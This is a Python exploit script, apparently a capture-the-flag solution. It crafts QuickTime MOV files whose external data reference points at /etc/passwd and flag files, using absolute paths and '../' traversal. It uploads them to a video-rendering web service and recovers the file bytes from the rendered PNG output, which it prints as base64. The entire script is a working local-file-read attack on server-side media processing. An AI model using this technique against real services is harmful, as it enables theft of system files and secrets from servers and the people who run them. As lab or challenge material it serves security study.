#!/usr/bin/env python3
import io, json, struct, base64, urllib.request, urllib.error, http.cookiejar

BASE="https://d7eef812-5707-splice-c7f97.mystery-challenges.webverselabs-pro.com"
def sess():
    cj=http.cookiejar.CookieJar()
    o=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)); o.addheaders=[("User-Agent","Mozilla/5.0")]; return o
def do(o,path,data=None,headers=None,method=None):
    r=urllib.request.Request(BASE+path,data=data,method=method)
    for k,v in (headers or {}).items(): r.add_header(k,v)
    try:
        resp=o.open(r,timeout=120); return resp.status,dict(resp.getheaders()),resp.read()
    except urllib.error.HTTPError as e: return e.code,dict(e.headers),e.read()
    except Exception as e: return -1,{},str(e).encode()
def upload(o,fn,content):
    bd="----x"; body=io.BytesIO()
    body.write((f"--{bd}\r\nContent-Disposition: form-data; name=\"clip\"; filename=\"{fn}\"\r\nContent-Type: video/quicktime\r\n\r\n").encode())
    body.write(content); body.write(f"\r\n--{bd}--\r\n".encode())
    return do(o,"/studio/upload",data=body.getvalue(),headers={"Content-Type":f"multipart/form-data; boundary={bd}"},method="POST")
def render(o,**kw):
    st,h,b=do(o,"/api/render",data=json.dumps(kw).encode(),headers={"Content-Type":"application/json"},method="POST")
    try: return json.loads(b)
    except: return b.decode('utf-8','replace')
def box(t,p): return struct.pack(">I",len(p)+8)+t+p
def fbox(t,ver,flags,p): return box(t, bytes([ver])+flags.to_bytes(3,"big")+p)
IDENT=struct.pack(">9i",0x10000,0,0,0,0x10000,0,0,0,0x40000000)

def build(offsets, path=None, mdat=None, rate=8000):
    # offsets: list of per-sample byte offsets (each sample size 1). one chunk per sample.
    N=len(offsets)
    mvhd=fbox(b"mvhd",0,0, struct.pack(">II",0,0)+struct.pack(">II",rate,N)+struct.pack(">I",0x10000)+struct.pack(">H",0x100)+b"\0"*10+IDENT+b"\0"*24+struct.pack(">I",2))
    tkhd=fbox(b"tkhd",0,7, struct.pack(">II",0,0)+struct.pack(">I",1)+b"\0"*4+struct.pack(">I",N)+b"\0"*8+struct.pack(">HH",0,0)+struct.pack(">H",0x100)+b"\0\0"+IDENT+struct.pack(">II",0,0))
    mdhd=fbox(b"mdhd",0,0, struct.pack(">II",0,0)+struct.pack(">II",rate,N)+struct.pack(">HH",0x55c4,0))
    hdlr=fbox(b"hdlr",0,0, b"\0\0\0\0"+b"soun"+b"\0"*12+b"SoundHandler\0")
    smhd=fbox(b"smhd",0,0, struct.pack(">HH",0,0))
    if path is None:
        url=fbox(b"url ",0,1, b"")            # self-contained
    else:
        url=fbox(b"url ",0,0, path.encode()+b"\0")
    dref=fbox(b"dref",0,0, struct.pack(">I",1)+url)
    dinf=box(b"dinf",dref)
    ase=struct.pack(">6xH",1)+struct.pack(">HHI",0,0,0)+struct.pack(">HHHH",1,8,0,0)+struct.pack(">I",rate<<16)
    stsd=fbox(b"stsd",0,0, struct.pack(">I",1)+box(b"raw ",ase))
    stts=fbox(b"stts",0,0, struct.pack(">I",1)+struct.pack(">II",N,1))
    stsc=fbox(b"stsc",0,0, struct.pack(">I",1)+struct.pack(">III",1,1,1))  # 1 sample/chunk
    stsz=fbox(b"stsz",0,0, struct.pack(">II",1,N))
    # stco filled later (needs base for self-contained). placeholder build twice.
    def assemble(off_list):
        stco=fbox(b"stco",0,0, struct.pack(">I",len(off_list))+b"".join(struct.pack(">I",o) for o in off_list))
        stbl=box(b"stbl",stsd+stts+stsc+stsz+stco)
        minf=box(b"minf",smhd+dinf+stbl)
        mdia=box(b"mdia",mdhd+hdlr+minf)
        trak=box(b"trak",tkhd+mdia)
        moov=box(b"moov",mvhd+trak)
        ftyp=box(b"ftyp",b"qt  "+struct.pack(">I",0x200)+b"qt  ")
        return ftyp,moov
    if path is None:
        # self-contained: offsets are relative to mdat payload; compute file base
        ftyp,moov=assemble([0]*N)  # to get sizes
        base=len(ftyp)+len(moov)+8   # +8 mdat header
        ftyp,moov=assemble([base+o for o in offsets])
        return ftyp+moov+box(b"mdat",mdat)
    else:
        ftyp,moov=assemble(offsets)
        return ftyp+moov

def emit(o, name, mov, slug="p"):
    upload(o,"clip.mov",mov)
    j=render(o,slug=slug,theme="midnight")
    ok=j.get("ok") if isinstance(j,dict) else None
    err=(j.get("errors") if isinstance(j,dict) else str(j)) or ""
    print(f"\n######## {name} ok={ok} moisize={len(mov)}")
    if ok:
        st,h,png=do(o,j["outputs"][0]["url"])
        print(f"B64_{name}_START"); print(base64.b64encode(png).decode()); print(f"B64_{name}_END")
    else:
        s=err.find("Input #0"); print(err[s:s+700] if s>=0 else err[-500:])

# 1) calibration: self-contained ramp, stretch each of 64 ramp values x32 = 2048 samples
o=sess(); do(o,"/studio")
ramp=bytes(range(0,256,4))              # 64 distinct values 0..252
offs=[i for i in range(64) for _ in range(32)]  # each value plateau of 32 samples -> 2048
emit(o,"CALIB_ramp", build(offs, path=None, mdat=ramp))

# 2) external /etc/passwd contiguous 2048 bytes offset0
o=sess(); do(o,"/studio")
emit(o,"passwd_abs", build(list(range(2048)), path="/etc/passwd"))
o=sess(); do(o,"/studio")
emit(o,"passwd_rel", build(list(range(2048)), path="../../../../../../etc/passwd"))

# 3) external flag: read offsets 0..63 each x32 (stretch) => 2048 samples
o=sess(); do(o,"/studio")
emit(o,"flag_rel_stretch", build([i for i in range(64) for _ in range(32)], path="../../flag.txt"))
o=sess(); do(o,"/studio")
emit(o,"flag_abs_stretch", build([i for i in range(64) for _ in range(32)], path="/opt/app/flag.txt"))
print("\nDONE")
